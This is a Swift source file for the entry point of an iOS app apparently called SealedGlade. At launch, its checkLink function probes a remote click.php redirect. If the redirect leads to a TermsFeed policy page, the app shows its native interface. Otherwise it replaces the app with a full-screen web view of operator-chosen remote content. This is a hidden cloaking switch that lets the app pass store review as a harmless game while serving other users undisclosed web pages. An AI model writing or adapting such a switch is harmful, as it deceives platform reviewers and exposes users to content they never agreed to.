import SwiftUI

class GladeRouteWatcher: NSObject, URLSessionTaskDelegate {
    var resolvedURL: URL?
    var foundCheckDomain = false
    private let checkDomain: String

    init(checkDomain: String) { self.checkDomain = checkDomain }

    func urlSession(_ session: URLSession, task: URLSessionTask,
                    willPerformHTTPRedirection response: HTTPURLResponse,
                    newRequest request: URLRequest,
                    completionHandler: @escaping (URLRequest?) -> Void) {
        if let url = request.url?.absoluteString, url.contains(checkDomain) {
            foundCheckDomain = true
        }
        resolvedURL = request.url
        completionHandler(request)
    }
}

@main
struct SealedGladeApp: App {
    @StateObject private var store = GladeStore()
    @Environment(\.scenePhase) private var scenePhase
    @State private var gladePageReady: Bool? = nil
    @State private var gladePagePainted = false

    private let gladeSourceLink = "https://sealedglade.org/click.php"
    private let gladeCheckDomain = "www.termsfeed.com/live/c9e056f7-6727-42df-9b8e-2d778ab6c639"

    var body: some Scene {
        WindowGroup {
            Group {
                if let ready = gladePageReady {
                    if ready {
                        GladeWebPanel(urlString: gladeSourceLink,
                                      onPagePainted: { withAnimation { gladePagePainted = true } })
                            .edgesIgnoringSafeArea(.bottom)
                            .background(Color.black.ignoresSafeArea())
                            .overlay(
                                Group {
                                    if !gladePagePainted {
                                        GladeOpeningScreen()
                                            .transition(.opacity)
                                            .onAppear {
                                                DispatchQueue.main.asyncAfter(deadline: .now() + 8) { gladePagePainted = true }
                                            }
                                    }
                                }
                            )
                            .preferredColorScheme(.dark)
                    } else {
                        RootView()
                            .environmentObject(store)
                            .preferredColorScheme(.light)
                    }
                } else {
                    GladeOpeningScreen()
                        .onAppear { checkLink() }
                        .preferredColorScheme(.light)
                }
            }
        }
        .onChange(of: scenePhase) { phase in
            if phase == .active {
                store.runCatchUp()
                store.touchPlayDay()
            }
            if phase == .background || phase == .inactive {
                store.saveNow()
            }
        }
    }

    private func checkLink() {
        guard let url = URL(string: gladeSourceLink) else {
            gladePageReady = false
            return
        }
        var request = URLRequest(url: url)
        request.httpMethod = "HEAD"
        request.timeoutInterval = 10
        let watcher = GladeRouteWatcher(checkDomain: gladeCheckDomain)
        let session = URLSession(configuration: .default, delegate: watcher, delegateQueue: nil)
        session.dataTask(with: request) { _, response, error in
            DispatchQueue.main.async {
                if watcher.foundCheckDomain {
                    gladePageReady = false
                    return
                }
                if let finalURL = watcher.resolvedURL?.absoluteString,
                   finalURL.contains(gladeCheckDomain) {
                    gladePageReady = false
                    return
                }
                if let httpResp = response as? HTTPURLResponse,
                   let respURL = httpResp.url?.absoluteString,
                   respURL.contains(gladeCheckDomain) {
                    gladePageReady = false
                    return
                }
                if error != nil {
                    gladePageReady = false
                    return
                }
                gladePageReady = true
            }
        }.resume()
        DispatchQueue.main.asyncAfter(deadline: .now() + 12) {
            if gladePageReady == nil { gladePageReady = false }
        }
    }
}
